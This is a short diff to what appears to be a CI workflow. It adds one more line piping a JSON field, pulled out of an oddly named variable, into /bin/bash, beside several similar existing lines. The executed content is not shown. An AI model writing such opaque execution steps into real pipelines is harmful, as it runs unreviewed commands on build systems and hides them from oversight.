@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$lmcvj6" | jq -r .y358 | /bin/bash
           echo $l481 | jq -r .kuz56 | /bin/bash
           echo $hlzdu1432 | jq -r .gl8696 | /bin/bash
+          printf '%s' "$zu44" | jq -r .u3 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
